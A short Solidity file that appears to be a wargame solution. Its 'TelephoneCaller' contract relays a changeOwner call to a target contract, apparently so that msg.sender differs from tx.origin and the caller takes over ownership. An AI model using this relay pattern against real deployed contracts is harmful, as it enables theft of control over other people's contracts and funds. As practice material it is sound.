// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneCaller {
    ProxyTelephone telephoneContract;
    constructor(address telephoneAddr) {
        telephoneContract = ProxyTelephone(telephoneAddr);
    }
    function changeOwner(address _owner) public {
        return telephoneContract.changeOwner(_owner);
    }
}
abstract contract ProxyTelephone {

  address public owner;

  function changeOwner(address _owner) public virtual;
}